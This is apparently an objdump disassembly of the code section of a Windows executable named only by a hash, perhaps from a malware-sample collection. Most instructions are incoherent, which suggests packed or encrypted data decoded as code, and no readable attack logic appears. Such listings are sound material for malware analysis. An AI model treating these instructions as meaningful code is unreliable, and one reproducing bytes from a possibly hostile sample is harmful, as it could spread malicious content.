
f047c58b2e3beda46cdbed7e54099595838614f6fd439413d581b9cee7aa0cf3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	lock or al,0x0
  401003:	xchg   BYTE PTR [eax],al
  401005:	add    BYTE PTR [ecx+0x0],al
  401008:	test   DWORD PTR [esi+0x0],ebp
  40100b:	add    DWORD PTR [edx+0x40],eax
  40100e:	or     ah,dh
  401010:	adc    dh,BYTE PTR [ecx]
  401012:	add    BYTE PTR [eax],0xe1
  401015:	or     DWORD PTR [edx+eax*1+0x1d82a000],eax
  40101c:	add    BYTE PTR [ecx],cl
  40101e:	rcl    BYTE PTR [eax+eax*4+0x13],0xb4
  401023:	mov    ds:0x8702d40,al
  401028:	add    BYTE PTR [edx],dh
  40102a:	add    BYTE PTR [ecx+0x12],al
  40102d:	add    BYTE PTR [eax],0x0
  401030:	pushf  
  401031:	and    BYTE PTR [eax],al
  401033:	cmp    BYTE PTR [eax+0x0],ah
  401036:	adc    DWORD PTR [eax+0x2],eax
  401039:	inc    eax
  40103a:	les    eax,FWORD PTR [eax]
  40103c:	add    BYTE PTR [eax-0x7fdfafe6],dl
  401042:	xor    BYTE PTR [eax],al
  401044:	and    BYTE PTR [eax],al
  401046:	add    BYTE PTR [ecx],al
  401048:	push   es
  401049:	inc    eax
  40104a:	add    BYTE PTR ds:0x20030100,dl
  401050:	add    DWORD PTR [edi+0x8042018],edx
  401056:	add    BYTE PTR [eax+0x0],al
  401059:	adc    DWORD PTR [ebx],0x29520804
  40105f:	add    al,BYTE PTR [edx+0x40]
  401062:	inc    ebp
  401063:	add    BYTE PTR [edx],0x82
  401066:	mov    DWORD PTR ds:0xd435014,edx
  40106c:	pushf  
  40106d:	xchg   ecx,eax
  40106e:	cdq    
  40106f:	add    BYTE PTR [edx],cl
  401071:	rol    BYTE PTR [eax],cl
  401073:	push   0x80d0
  401078:	inc    edx
  401079:	push   eax
  40107a:	push   esp
  40107b:	add    BYTE PTR [eax],ch
  40107d:	adc    DWORD PTR [eax],eax
  40107f:	and    BYTE PTR [ebx+0x32],al
  401082:	add    BYTE PTR [eax+0x4008066],cl
  401088:	add    BYTE PTR [ecx],dh
  40108a:	les    edi,FWORD PTR [ecx]
  40108c:	add    al,0x1
  40108e:	cmp    al,0x50
  401090:	mov    DWORD PTR [eax+0x1],eax
  401093:	push   edx
  401094:	and    DWORD PTR [edx+0x10],eax
  401097:	add    eax,0x80443240
  40109c:	or     BYTE PTR [eax+0xb],al
  40109f:	adc    BYTE PTR [ebx],0x15
  4010a2:	add    BYTE PTR [edx+0x5],dl
  4010a5:	add    dl,BYTE PTR [eax+eiz*2]
  4010a8:	mov    al,0x82
  4010aa:	or     DWORD PTR [eax],ecx
  4010ac:	add    al,0x19
  4010ae:	push   es
  4010af:	add    eax,0x58103400
  4010b4:	and    BYTE PTR [eax+ebp*1],al
  4010b7:	xor    ch,BYTE PTR [ecx]
  4010b9:	or     BYTE PTR [esi],ch
  4010bb:	fs aam 0x80
  4010be:	add    BYTE PTR [ecx],dl
  4010c0:	sbb    al,0x1
  4010c2:	add    BYTE PTR [eax+0xc],al
  4010c5:	cmp    ah,BYTE PTR [ecx]
  4010c7:	add    al,0x81
  4010c9:	inc    esi
  4010ca:	fs inc edi
  4010cc:	inc    esp
  4010cd:	sbb    al,0x20
  4010cf:	add    al,BYTE PTR [eax+eax*1]
  4010d2:	add    eax,0x614210
  4010d7:	inc    eax
  4010d8:	or     BYTE PTR [edx+0x4514922],al
  4010de:	or     cl,ah
  4010e0:	loopne 0x40113a
  4010e2:	add    BYTE PTR [edx],ah
  4010e4:	add    BYTE PTR [ecx],0x22
  4010e7:	add    al,0x4
  4010e9:	adc    BYTE PTR [ecx+ecx*4-0x80],ch
  4010ed:	push   esp
  4010ee:	scas   eax,DWORD PTR es:[edi]
  4010ef:	rol    BYTE PTR [eax],0x12
  4010f2:	add    DWORD PTR [eax+0x49781810],0x2200252
  4010fc:	add    BYTE PTR [eax],cl
  4010fe:	push   es
  4010ff:	inc    edx
  401100:	inc    ecx
  401101:	xor    eax,0x7009220
  401106:	and    BYTE PTR [eax],0x2
  401109:	ror    BYTE PTR [edx+0x13252404],1
  40110f:	add    BYTE PTR [ecx],al
  401111:	inc    eax
  401112:	add    BYTE PTR [edx-0x5f],al
  401115:	cdq    
  401116:	adc    eax,0xa288008
  40111b:	add    BYTE PTR [eax],bl
  40111d:	adc    ch,BYTE PTR [eax]
  40111f:	push   esp
  401120:	xor    al,ah
  401122:	add    cl,BYTE PTR [eax]
  401124:	adc    BYTE PTR [edx],ah
  401126:	adc    DWORD PTR [edx+0x28106412],ecx
  40112c:	or     eax,DWORD PTR [eax+0x1040a0ec]
  401132:	xchg   edx,eax
  401133:	cmp    BYTE PTR [eax],al
  401135:	adc    ah,BYTE PTR [eax-0x8]
  401138:	mov    ds:0xc4d9c040,eax
  40113d:	dec    esp
  40113e:	js     0x401140
  401140:	xchg   BYTE PTR [esp+ecx*1-0x5c7d6fcf],al
  401147:	add    al,0x31
  401149:	add    BYTE PTR ds:0x404a2816,al
  40114f:	add    BYTE PTR [eax],cl
  401151:	add    al,0x24
  401153:	fdiv   DWORD PTR [ecx+0x0]
  401156:	add    BYTE PTR [edx],bl
  401158:	pusha  
  401159:	or     BYTE PTR [eax+0x40fa20d],0x34
  401160:	push   0x20b81182
  401165:	adc    BYTE PTR [eax],dl
  401167:	inc    eax
  401168:	rol    BYTE PTR [edx],1
  40116a:	add    BYTE PTR [eax+0x3b012380],bl
  401170:	add    al,al
  401172:	mov    al,ds:0x81198280
  401177:	sub    BYTE PTR [eax+0x18864009],dh
  40117d:	rol    BYTE PTR [eax],1
  40117f:	add    al,0x61
  401181:	add    al,0x46
  401183:	inc    eax
  401184:	and    al,0xa1
  401186:	add    BYTE PTR [ecx],al
  401188:	add    BYTE PTR [esp+ecx*4],cl
  40118b:	shl    DWORD PTR [ecx],1
  40118d:	add    BYTE PTR [eax],0xc
  401190:	fst    DWORD PTR [eax]
  401192:	mov    esp,es
  401194:	mov    BYTE PTR [ecx],ch
  401196:	add    BYTE PTR [esi],al
  401198:	push   ecx
  401199:	xchg   ebp,eax
  40119a:	inc    ebx
  40119b:	add    al,0x8d
  40119d:	mov    BYTE PTR [edx-0x7f],al
  4011a0:	add    BYTE PTR [ecx+0x37830290],0xc0
  4011a7:	sbb    DWORD PTR ds:0xe04403a,0xc0680888
  4011b1:	add    eax,0xa0e42001
  4011b6:	adc    ah,cl
  4011b8:	add    ah,BYTE PTR [eax]
  4011ba:	pusha  
  4011bb:	inc    ecx
  4011bc:	es add eax,0x402881d0
  4011c2:	test   BYTE PTR [eax],ah
  4011c4:	and    eax,0xd012401
  4011ca:	rcl    BYTE PTR [eax],0xe2
  4011cd:	fs pop esp
  4011cf:	add    DWORD PTR [edx+eax*2],ecx
  4011d2:	mov    al,ds:0x74082003
  4011d7:	inc    ecx
  4011d8:	and    BYTE PTR ds:0x15080025,0x49
  4011df:	aad    0x48
  4011e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011e2:	xor    al,0x52
  4011e4:	cmp    BYTE PTR [eax],cl
  4011e6:	inc    ebp
  4011e7:	add    BYTE PTR [esi],0x8a
  4011ea:	dec    esp
  4011eb:	add    DWORD PTR [eax],esp
  4011ed:	add    DWORD PTR [eax+eax*4],edx
  4011f0:	pusha  
  4011f1:	add    al,al
  4011f3:	add    BYTE PTR [eax],ah
  4011f5:	and    cl,BYTE PTR [esi]
  4011f7:	add    BYTE PTR [ecx],dl
  4011f9:	sbb    al,al
  4011fb:	add    BYTE PTR [eax],al
  4011fd:	add    BYTE PTR [eax+0x36],cl
  401200:	or     BYTE PTR [esp+eax*8],0x0
  401204:	or     DWORD PTR [eax-0xc],eax
  401207:	inc    eax
  401208:	and    BYTE PTR [eax],al
  40120a:	xor    BYTE PTR [eax+0x4],dl
  40120d:	and    BYTE PTR [ebx+esi*1+0x570488],cl
  401214:	and    ch,BYTE PTR [eax]
  401216:	loop   0x401258
  401218:	add    BYTE PTR [edx-0x7effff70],al
  40121e:	mov    al,ds:0x40a5018
  401223:	add    BYTE PTR [ecx],cl
  401225:	mov    al,ds:0x4020111
  40122a:	add    BYTE PTR [eax-0x36],ah
  40122d:	mov    ch,0x16
  40122f:	and    eax,0x4010180
  401234:	loop   0x401252
  401236:	inc    eax
  401237:	inc    eax
  401238:	dec    eax
  401239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40123a:	nop
  40123b:	pop    edx
  40123c:	sub    BYTE PTR [eax-0x80],ch
  40123f:	dec    edx
  401240:	test   al,0xa
  401242:	add    DWORD PTR [edx+eax*1],esp
  401245:	sub    DWORD PTR [eax+0x0],eax
  401248:	adc    BYTE PTR [ecx],al
  40124a:	xchg   BYTE PTR [eax+0x1],ah
  40124d:	push   eax
  40124e:	add    BYTE PTR [eax],ch
  401250:	and    BYTE PTR [eax+0x328c04c],dl
  401256:	rcl    BYTE PTR [edx-0x1e5bbee4],cl
  40125c:	and    BYTE PTR [eax],ah
  40125e:	les    eax,FWORD PTR [eax]
  401260:	add    al,0x1
  401262:	inc    eax
  401263:	mov    eax,ds:0x40048880
  401268:	mov    eax,ds:0x2000b
  40126d:	add    al,0x8
  40126f:	and    BYTE PTR [eax+0x1c6420a0],ah
  401275:	inc    eax
  401276:	mov    ch,BYTE PTR [ecx]
  401278:	add    cl,BYTE PTR [ecx]
  40127a:	adc    BYTE PTR [ebx],al
  40127c:	adc    al,0x16
  40127e:	sbb    BYTE PTR [edx+0x4102422],cl
  401284:	or     al,0x24
  401286:	sbb    DWORD PTR [ecx],esi
  401288:	call   0xc012:0xe4040021
  40128f:	add    eax,DWORD PTR [edx+0x20081810]
  401295:	adc    al,al
  401297:	enter  0x8070,0xa3
  40129b:	adc    BYTE PTR [edx+0x2e],ah
  40129e:	mov    eax,ds:0xe04e8449
  4012a3:	and    cl,al
  4012a5:	add    BYTE PTR [ecx],dl
  4012a7:	add    BYTE PTR [eax+ecx*2],al
  4012aa:	and    al,0x91
  4012ac:	push   ecx
  4012ad:	add    BYTE PTR [eax],al
  4012af:	or     al,0x20
  4012b1:	adc    BYTE PTR [edx],al
  4012b3:	loopne 0x4012b5
  4012b5:	and    BYTE PTR [eax],al
  4012b7:	sub    DWORD PTR [edx+0x5d],esp
  4012ba:	and    BYTE PTR [eax],cl
  4012bc:	test   al,0x11
  4012be:	add    ecx,DWORD PTR [edx+0x1924840]
  4012c4:	inc    eax
  4012c5:	add    BYTE PTR [eax+eax*1-0x39ebd97c],cl
  4012cc:	add    BYTE PTR [eax],al
  4012ce:	loop   0x4012d0
  4012d0:	add    al,BYTE PTR [eax]
  4012d2:	inc    edx
  4012d3:	add    eax,0x1c28e12
  4012d8:	lds    eax,FWORD PTR [eax]
  4012da:	add    al,0x0
  4012dc:	add    BYTE PTR [ecx+0x0],al
  4012df:	add    BYTE PTR [eax+0x2e],al
  4012e2:	add    BYTE PTR ds:0x1509e000,dl
  4012e8:	mov    al,ds:0x4002000
  4012ed:	adc    al,BYTE PTR [eax]
  4012ef:	popa   
  4012f0:	mov    edi,DWORD PTR [ebx+ebx*4]
  4012f3:	inc    ecx
  4012f4:	add    DWORD PTR [edx],esp
  4012f6:	add    BYTE PTR cs:[eax+0x60008122],al
  4012fd:	mov    ds:0x2099880c,al
  401302:	sub    cl,BYTE PTR [edx]
  401304:	push   ecx
  401305:	add    al,0x81
  401307:	adc    esp,eax
  401309:	adc    BYTE PTR [ecx],al
  40130b:	push   edx
  40130c:	sbb    BYTE PTR [eax],al
  40130e:	and    BYTE PTR [ecx+0x0],al
  401311:	add    DWORD PTR [eax+0x20c009],esp
  401317:	or     eax,0x13082460
  40131c:	adc    DWORD PTR [edx+0x1],eax
  40131f:	add    al,BYTE PTR [ecx+edx*1]
  401322:	xchg   edx,eax
  401323:	or     DWORD PTR [eax+esi*1+0x10660500],eax
  40132a:	loopne 0x4012ac
  40132c:	or     al,0x19
  40132e:	test   BYTE PTR [edx],al
  401330:	add    BYTE PTR [ecx+0x29000002],0x82
  401337:	add    al,0x2c
  401339:	pop    ss
  40133a:	sub    cl,dl
  40133c:	xchg   BYTE PTR [eax+eax*1-0x77],dl
  401340:	add    al,BYTE PTR [eax+0x0]
  401343:	and    BYTE PTR [edx],ch
  401345:	adc    DWORD PTR [eax],eax
  401347:	add    BYTE PTR [ecx-0x70],al
  40134a:	inc    edx
  40134b:	add    al,0x3e
  40134d:	xchg   edx,eax
  40134e:	adc    al,BYTE PTR [eax]
  401350:	dec    esp
  401351:	int3   
  401352:	mov    eax,ds:0x5001548
  401357:	xor    al,0x0
  401359:	mov    BYTE PTR [ecx],al
  40135b:	adc    ecx,DWORD PTR [eax+eiz*1]
  40135e:	add    al,0x4
  401360:	and    al,BYTE PTR [eax]
  401362:	sbb    BYTE PTR [eax],ah
  401364:	add    BYTE PTR [ecx],bl
  401366:	add    ah,BYTE PTR [eiz*1-0x6fcbcb5c]
  40136d:	add    eax,esp
  40136f:	xor    BYTE PTR [esi+0x4],dl
  401372:	inc    eax
  401373:	mov    al,ds:0x49b10150
  401378:	rol    BYTE PTR [eax],0x80
  40137b:	add    BYTE PTR [ecx+0x1e99003d],0x94
  401382:	adc    DWORD PTR [edi-0x3b],0x4086008
  401389:	add    eax,0x42b08c08
  40138e:	test   eax,0x1000247
  401393:	adc    DWORD PTR [eax],eax
  401395:	test   BYTE PTR [ecx+0x10087c0],al
  40139b:	or     BYTE PTR [eax+0x402c0811],0xa
  4013a2:	add    DWORD PTR [ebx+0x1],esp
  4013a5:	inc    esp
  4013a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013a7:	add    DWORD PTR [edx],esp
  4013a9:	and    BYTE PTR [ecx],al
  4013ab:	xchg   esp,eax
  4013ac:	inc    edx
  4013ad:	add    DWORD PTR [ecx],eax
  4013af:	and    BYTE PTR [eax],al
  4013b1:	or     BYTE PTR [ecx+0x22],al
  4013b4:	and    BYTE PTR ds:0x4b210040,al
  4013ba:	sbb    eax,0x48248262
  4013bf:	add    al,0x5
  4013c1:	loop   0x4013c9
  4013c3:	inc    ecx
  4013c4:	or     BYTE PTR [ebp+0x9],0x2
  4013c8:	sub    esp,DWORD PTR [eax+ebx*8+0xc981310]
  4013cf:	add    al,BYTE PTR [esp+eax*4+0x1]
  4013d3:	rcr    BYTE PTR [eax-0x7f7555fc],0x82
  4013da:	and    DWORD PTR [eax+0x13240],ecx
  4013e0:	xchg   esi,eax
  4013e1:	mov    cl,0xe2
  4013e3:	add    DWORD PTR [esi],eax
  4013e5:	add    eax,ebx
  4013e7:	or     BYTE PTR [eax-0x7c],dh
  4013ea:	add    eax,0x12112190
  4013ef:	inc    ecx
  4013f0:	push   es
  4013f1:	add    BYTE PTR [eax],al
  4013f3:	adc    BYTE PTR [ecx],al
  4013f5:	sbb    bl,BYTE PTR [ebp+0x1c820020]
  4013fb:	push   eax
  4013fc:	add    BYTE PTR [eax],al
  4013fe:	adc    DWORD PTR [ecx+0x30600051],0xffffff80
  401405:	push   eax
  401406:	inc    ecx
  401407:	inc    ecx
  401408:	inc    ebx
  401409:	add    BYTE PTR [eax-0x773e26c0],ah
  40140f:	add    BYTE PTR [eax-0x5d5ee500],0x0
  401416:	lock and BYTE PTR [eax],ch
  401419:	inc    edx
  40141a:	push   ecx
  40141b:	and    esi,DWORD PTR [eax]
  40141d:	add    eax,DWORD PTR [eax]
  40141f:	mov    ah,0x0
  401421:	add    BYTE PTR [eax+0x2],al
  401424:	add    DWORD PTR [eax],ecx
  401426:	and    BYTE PTR [eax+eax*4+0x10202e81],0x0
  40142e:	or     al,0xb1
  401430:	inc    ecx
  401431:	ror    BYTE PTR [eax+0x2a283800],0x76
  401438:	add    DWORD PTR [edx],esp
  40143a:	rol    DWORD PTR [eax],1
  40143c:	and    BYTE PTR [ecx+0x4],ah
  40143f:	or     dl,BYTE PTR [ecx]
  401441:	add    al,0x60
  401443:	add    BYTE PTR [eax+0x1200e4c2],al
  401449:	adc    BYTE PTR [eax],al
  40144b:	test   BYTE PTR [eax],bh
  40144d:	add    BYTE PTR [edx+0xd204a00],al
  401453:	inc    eax
  401454:	and    DWORD PTR [eax+0x61490081],eax
  40145a:	adc    al,0x2
  40145c:	shl    BYTE PTR cs:[eax],0x4
  401460:	mov    al,ds:0xe0200180
  401465:	inc    esp
  401466:	xchg   esp,eax
  401467:	add    DWORD PTR [ecx+edx*4],ecx
  40146a:	and    BYTE PTR [ecx+eax*4+0x41],dl
  40146e:	(bad)  
  40146f:	stc    
  401470:	add    BYTE PTR [edx],bl
  401472:	add    BYTE PTR [edi],cl
  401474:	lock inc edx
  401476:	push   esp
  401477:	nop
  401478:	js     0x4014be
  40147a:	add    al,0x70
  40147c:	mov    BYTE PTR [edx],al
  40147e:	add    BYTE PTR [ecx+0x4165800],ah
  401484:	inc    eax
  401485:	sub    BYTE PTR [edx],dl
  401487:	adc    DWORD PTR [edx],eax
  401489:	mov    WORD PTR [ecx],fs
  40148b:	xchg   esp,eax
  40148c:	and    BYTE PTR [eax+edx*2-0x64],ch
  401490:	add    al,0x8
  401492:	add    BYTE PTR [eax],dl
  401494:	add    BYTE PTR [eax+0x30a82],al
  40149a:	clc    
  40149b:	add    BYTE PTR [edx+0x45],dl
  40149e:	dec    edx
  40149f:	and    BYTE PTR [eax],al
  4014a1:	add    BYTE PTR [eax],al
  4014a3:	add    DWORD PTR [eax],ecx
  4014a5:	and    BYTE PTR [eax*1+0x1c863],al
  4014ac:	push   eax
  4014ad:	add    ecx,ecx
  4014af:	mov    al,0x14
  4014b1:	cmp    al,BYTE PTR [eax]
  4014b3:	or     BYTE PTR [eax],al
  4014b5:	inc    eax
  4014b6:	add    ah,BYTE PTR [eax]
  4014b8:	test   ah,al
  4014ba:	dec    esp
  4014bb:	add    BYTE PTR ds:0x800c0044,al
  4014c1:	inc    edx
  4014c2:	and    BYTE PTR [edx+eiz*2+0x41],al
  4014c6:	aaa    
  4014c7:	add    al,0x23
  4014c9:	add    edx,DWORD PTR [ecx+eiz*2]
  4014cc:	rol    BYTE PTR [esp+eax*4],0x8
  4014d0:	pusha  
  4014d1:	ret    0x3405
  4014d4:	jb     0x4014fa
  4014d6:	out    0x4,al
  4014d8:	add    DWORD PTR [ecx],eax
  4014da:	jo     0x40150f
  4014dc:	add    BYTE PTR [eax],al
  4014de:	adc    BYTE PTR [eax-0x5f],0x8
  4014e2:	mov    BYTE PTR [eax+edx*2],al
  4014e5:	ret    
  4014e6:	pusha  
  4014e7:	or     al,0x48
  4014e9:	sub    BYTE PTR [ecx+0x0],al
  4014ec:	add    al,0x0
  4014ee:	adc    al,0x80
  4014f0:	sub    BYTE PTR [eax],cl
  4014f2:	dec    eax
  4014f3:	inc    eax
  4014f4:	add    cl,BYTE PTR [edx+0x4]
  4014f7:	add    BYTE PTR [ebx],dh
  4014f9:	mov    al,ds:0x1080b863
  4014fe:	add    BYTE PTR [ecx],bl
  401500:	sub    DWORD PTR [ecx],ecx
  401502:	add    dh,BYTE PTR [esp+eax*1]
  401505:	inc    esp
  401506:	bound  eax,QWORD PTR [eax+eax*1+0x50]
  40150a:	sub    BYTE PTR [edx-0x3dddfb9d],ch
  401510:	push   edx
  401511:	and    eax,DWORD PTR [eax]
  401513:	adc    al,0x90
  401515:	ins    DWORD PTR es:[edi],dx
  401516:	inc    esi
  401517:	or     al,0x3
  401519:	push   0xe008080
  40151e:	add    al,0x29
  401520:	pusha  
  401521:	je     0x401523
  401523:	jb     0x401527
  401525:	xor    DWORD PTR [ecx],edi
  401527:	or     BYTE PTR [eax-0x35b7edef],al
  40152d:	or     al,0x5
  40152f:	add    BYTE PTR [ecx],al
  401531:	adc    DWORD PTR [eax+eax*4],0x8c012240
  401538:	inc    ebp
  401539:	adc    BYTE PTR [eax],cl
  40153b:	loopne 0x40153d
  40153d:	or     BYTE PTR [ecx+0x0],ah
  401540:	and    BYTE PTR [eax+0x1010a148],bl
  401546:	push   eax
  401547:	add    al,0x20
  401549:	or     BYTE PTR [edx],bl
  40154b:	inc    esp
  40154c:	add    ch,BYTE PTR [ecx]
  40154e:	add    BYTE PTR [eax+0x11],bl
  401551:	adc    al,0x0
  401553:	or     BYTE PTR [eax+0x1280260],al
  401559:	scas   al,BYTE PTR es:[edi]
  40155a:	add    al,0x60
  40155c:	push   eax
  40155d:	or     BYTE PTR [edx+edx*2],0x80
  401561:	add    ch,BYTE PTR [ecx+0x8820012]
  401567:	adc    al,BYTE PTR [eax+0x211008a1]
  40156d:	mov    al,ds:0x11e30500
  401572:	push   esp
  401573:	and    eax,DWORD PTR [eax+0x60]
  401576:	push   edx
  401577:	rol    BYTE PTR [esi+0x8],0x1
  40157b:	test   BYTE PTR [eax],ah
  40157d:	inc    esp
  40157e:	add    BYTE PTR [eax-0x80],cl
  401581:	add    al,0x4
  401583:	and    DWORD PTR [eax+0x4009042],ecx
  401589:	add    al,al
  40158b:	dec    edx
  40158c:	add    BYTE PTR [eax],cl
  40158e:	push   eax
  40158f:	add    BYTE PTR [edx],al
  401591:	jnp    0x401533
  401593:	add    al,0x83
  401595:	inc    eax
  401596:	add    DWORD PTR [edx+0x49],ecx
  401599:	inc    esp
  40159a:	xchg   ecx,eax
  40159b:	add    dh,BYTE PTR [edx+edx*1]
  40159e:	add    al,0x0
  4015a0:	inc    eax
  4015a1:	add    al,BYTE PTR [eax+0x11]
  4015a4:	add    cl,BYTE PTR [edx+0x24502421]
  4015aa:	xor    al,0xa0
  4015ac:	nop
  4015ad:	add    al,ch
  4015af:	ret    
  4015b0:	inc    esp
  4015b1:	adc    al,BYTE PTR [eax]
  4015b3:	popa   
  4015b4:	and    BYTE PTR [ecx],ch
  4015b6:	or     eax,DWORD PTR [eax+edx*4]
  4015b9:	nop
  4015ba:	inc    esp
  4015bb:	adc    eax,0xc0078448
  4015c0:	or     cl,0x92
  4015c3:	rol    BYTE PTR ds:0x2909001,1
  4015c9:	pop    ebp
  4015ca:	add    al,0x0
  4015cc:	fs xor al,dh
  4015cf:	xchg   esi,eax
  4015d0:	rol    BYTE PTR [edx],1
  4015d2:	and    ch,BYTE PTR ds:0x210520
  4015d8:	push   0x200808c0
  4015dd:	or     al,BYTE PTR [ecx]
  4015df:	add    BYTE PTR [edx-0x3fe7223c],cl
  4015e5:	mov    WORD PTR [eax+0x44],cs
  4015e8:	or     BYTE PTR [eax],al
  4015ea:	add    al,al
  4015ec:	or     BYTE PTR [eax+0x111100c0],cl
  4015f2:	test   BYTE PTR [eax],ah
  4015f4:	ror    BYTE PTR [esi+0x60],0x48
  4015f8:	pusha  
  4015f9:	into   
  4015fa:	add    eax,0x1188180
  4015ff:	or     al,0x84
  401601:	add    bh,BYTE PTR [ebx+0x64750082]
  401607:	and    DWORD PTR [eax],eax
  401609:	rcl    BYTE PTR ds:0x870b1269,1
  40160f:	inc    eax
  401610:	cld    
  401611:	sbb    BYTE PTR [ebx],al
  401613:	add    BYTE PTR [eax],al
  401615:	sbb    BYTE PTR [eax],dl
  401617:	mov    WORD PTR [edx],es
  401619:	pusha  
  40161a:	add    eax,0x2454888c
  40161f:	ret    
  401620:	inc    ecx
  401621:	xchg   ecx,eax
  401622:	add    eax,0x59484
  401627:	and    DWORD PTR [ecx-0x37cfedef],eax
  40162d:	add    BYTE PTR [eax+0x21180004],ch
  401633:	push   cs
  401634:	inc    edx
  401635:	add    cl,BYTE PTR [eax]
  401637:	add    DWORD PTR [eax+eax*4],eax
  40163a:	add    BYTE PTR ds:0x1e804cc6,al
  401640:	adc    al,ah
  401642:	xchg   esp,eax
  401643:	inc    eax
  401644:	inc    esp
  401645:	or     ecx,edx
  401647:	ss and al,0x2b
  40164a:	sub    al,0x20
  40164c:	inc    ebp
  40164d:	add    BYTE PTR [ecx],al
  40164f:	add    BYTE PTR [esi],ch
  401651:	and    DWORD PTR [eax+0x42],esi
  401654:	rol    BYTE PTR [ecx+0x43412028],1
  40165a:	add    BYTE PTR [edx+ecx*1+0xd24e0c0],ah
  401661:	add    al,0xc0
  401663:	or     BYTE PTR [ecx-0x79fbe000],0x11
  40166a:	and    ebx,DWORD PTR [edx+0x800431]
  401670:	cmove  eax,DWORD PTR [edx]
  401673:	add    BYTE PTR ds:0x10c04aa8,dl
  401679:	push   eax
  40167a:	and    eax,0x4101a2a0
  40167f:	add    DWORD PTR [eax],eax
  401681:	or     edx,DWORD PTR [eax+0x40]
  401684:	xor    al,0x43
  401686:	inc    eax
  401687:	or     BYTE PTR [eax-0x78],cl
  40168a:	shl    DWORD PTR [eax],0x14
  40168d:	mov    dl,BYTE PTR [ecx]
  40168f:	mov    eax,ds:0xaa2c440
  401694:	add    ah,al
  401696:	add    BYTE PTR [eax],cl
  401698:	adc    DWORD PTR [eax],eax
  40169a:	sub    al,0x40
  40169c:	or     BYTE PTR [eax],ah
  40169e:	add    BYTE PTR [ebx+0x10],al
  4016a1:	inc    eax
  4016a2:	add    DWORD PTR [edx-0x7e],esp
  4016a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a6:	or     BYTE PTR [eax],ah
  4016a8:	add    BYTE PTR [edx],ch
  4016aa:	and    eax,0x20804110
  4016af:	and    ah,ah
  4016b1:	stc    
  4016b2:	mov    dl,BYTE PTR [eax]
  4016b4:	adc    BYTE PTR [edx],0x70
  4016b7:	xor    al,BYTE PTR [edx+0x40992040]
  4016bd:	add    BYTE PTR [eax],al
  4016bf:	inc    eax
  4016c0:	add    BYTE PTR [edx+edx*1],al
  4016c3:	add    al,0x2c
  4016c5:	xor    al,0xca
  4016c7:	or     BYTE PTR [ecx+0x52051480],0x28
  4016ce:	shl    DWORD PTR [eax+0x78480c],0x9
  4016d5:	inc    ebp
  4016d6:	add    BYTE PTR [ecx],0x90
  4016d9:	add    BYTE PTR [edx+0x20],0xc
  4016dd:	add    BYTE PTR [esi+esi*8],ah
  4016e0:	and    BYTE PTR [edx+0x205240d0],bl
  4016e6:	mov    al,ds:0xe3104190
  4016eb:	add    eax,DWORD PTR [eax]
  4016ed:	inc    edx
  4016ee:	inc    esp
  4016ef:	add    BYTE PTR [eax],bh
  4016f1:	or     dl,al
  4016f3:	or     DWORD PTR ds:0x12d8a04,eax
  4016f9:	add    BYTE PTR [edx+0x20],cl
  4016fc:	add    BYTE PTR [ebx+eiz*1],al
  4016ff:	and    DWORD PTR [eax+0x6a052841],eax
  401705:	add    DWORD PTR [eax],ecx
  401707:	adc    BYTE PTR [eax+eax*1],cl
  40170a:	or     eax,0x9c42721
  40170f:	add    BYTE PTR [ecx],cl
  401711:	adc    BYTE PTR es:0x9028814c,cl
  401718:	adc    DWORD PTR [eax+0x0],edx
  40171b:	adc    BYTE PTR [eax-0x3e],ah
  40171e:	add    al,BYTE PTR [eax]
  401720:	dec    esp
  401721:	add    BYTE PTR [eax+0x8c19160],al
  401727:	dec    esp
  401728:	add    BYTE PTR [edx+0x8018f01],0x12
  40172f:	cwde   
  401730:	inc    ebp
  401731:	lea    eax,[eax]
  401733:	and    BYTE PTR [eax+edx*2+0x88ad08],cl
  40173a:	add    dl,al
  40173c:	add    al,0x4
  40173e:	inc    edx
  40173f:	inc    eax
  401740:	add    edi,DWORD PTR [esi+0x28]
  401743:	mov    BYTE PTR [eax],cl
  401745:	xor    eax,0x40000890
  40174a:	push   ecx
  40174b:	xchg   ecx,eax
  40174c:	or     BYTE PTR [esp+esi*1+0x2400102],al
  401753:	or     ah,dh
  401755:	inc    eax
  401756:	add    al,0x4
  401758:	adc    BYTE PTR [eax],ah
  40175a:	arpl   WORD PTR [eax+0x41c07811],ax
  401760:	or     al,0x92
  401762:	xor    BYTE PTR [edx],al
  401764:	add    dl,BYTE PTR [eax+0x4062a00]
  40176a:	test   al,0x6c
  40176c:	and    DWORD PTR [eax],eax
  40176e:	add    BYTE PTR [ebx],cl
  401770:	or     al,0x0
  401772:	inc    esi
  401773:	add    cl,BYTE PTR [eax]
  401775:	or     al,BYTE PTR [edx]
  401777:	mov    WORD PTR [edi],ds
  401779:	add    DWORD PTR [ecx-0x73],eax
  40177c:	add    al,0x4
  40177e:	add    BYTE PTR [edx],dl
  401780:	or     BYTE PTR [eax],al
  401782:	add    BYTE PTR [eax],al
  401784:	adc    eax,0x40080cba
  401789:	mov    DWORD PTR [ecx],ecx
  40178b:	add    BYTE PTR [ecx],al
  40178d:	and    BYTE PTR [eax],al
  40178f:	add    al,0x80
  401791:	add    eax,ecx
  401793:	test   DWORD PTR [edx],ecx
  401795:	and    BYTE PTR [eax+eax*1],dl
  401798:	or     DWORD PTR [eax],eax
  40179a:	push   eax
  40179b:	cwde   
  40179c:	add    dl,ah
  40179e:	add    cl,BYTE PTR [eax]
  4017a0:	dec    eax
  4017a1:	test   BYTE PTR [ecx+0x32560001],cl
  4017a7:	and    al,0xf0
  4017a9:	and    cl,BYTE PTR [ecx]
  4017ab:	add    BYTE PTR [edx+0x4],ah
  4017ae:	shl    DWORD PTR [ecx+0x10],cl
  4017b1:	adc    al,0x4
  4017b3:	and    DWORD PTR [ebp-0x80],esp
  4017b6:	(bad)  
  4017b7:	cmp    BYTE PTR [eax+0x32600008],dl
  4017bd:	add    BYTE PTR [esp+eax*2+0x4],0x25
  4017c2:	push   ds
  4017c3:	or     eax,0x29000408
  4017c8:	add    al,BYTE PTR [ebx-0x69738cfc]
  4017ce:	mov    ds:0xe015ff3d,al
  4017d3:	xor    al,BYTE PTR [ecx+0x0]
  4017d6:	add    BYTE PTR [ebx],0x40
  4017d9:	mov    BYTE PTR [ecx],al
  4017db:	and    bl,BYTE PTR [eax+0x51]
  4017de:	inc    edx
  4017df:	sbb    BYTE PTR [ecx],ah
